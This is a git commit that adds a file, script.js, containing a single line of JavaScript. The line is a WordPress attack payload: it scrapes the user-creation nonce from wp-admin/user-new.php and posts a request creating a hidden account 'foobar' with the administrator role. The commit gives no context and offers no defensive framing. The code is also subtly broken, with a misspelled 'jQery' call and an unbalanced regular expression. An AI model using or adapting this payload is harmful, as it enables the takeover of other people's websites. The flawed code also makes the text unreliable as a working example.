bb4b31e69f9062378bfd00a97178d744c7c3af8a
takechiushi <42527149+takechiushi@users.noreply.github.com>
2021-07-15 08:45:17 +0700

    Add files via upload

---
+++ script.js
@@ -0,0 +1,1 @@
+u="wp-admin/user-new.php";jQuery.get(u,function(e){jQery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?\"/)[1],user_login:"foobar",email:"foo@bar.com",pass1:"foo",pass2:"foo",role:"administrator"})});
